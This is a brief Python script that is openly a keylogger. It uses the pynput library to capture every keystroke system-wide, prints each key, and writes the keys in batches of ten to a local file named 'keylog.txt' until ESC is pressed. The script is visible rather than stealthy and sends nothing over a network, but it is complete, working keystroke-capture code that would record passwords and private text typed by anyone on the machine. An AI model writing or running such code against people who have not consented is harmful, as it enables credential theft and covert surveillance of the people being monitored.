from pynput.keyboard import Key, Listener

log_file = "keylog.txt"
current_keys = []

def write_to_file(keys):
    with open(log_file, "a") as f:
        for key in keys:
            f.write(str(key))
        f.write("\n")

def on_press(key):
    global current_keys
    try:
        current_keys.append(key.char)
        print(f"Key pressed: {key.char}")  # Print the pressed key
    except AttributeError:
        if key == Key.space:
            current_keys.append(" ")
            print("Key pressed: Space")  # Print the pressed key
        else:
            current_keys.append(f" [{str(key)}] ")
            print(f"Key pressed: [{key}]")  # Print the pressed key

    if len(current_keys) >= 10:
        write_to_file(current_keys)
        current_keys = []

def on_release(key):
    if key == Key.esc:
        write_to_file(current_keys)
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger is running. Press ESC to stop and exit...")
    listener.join()
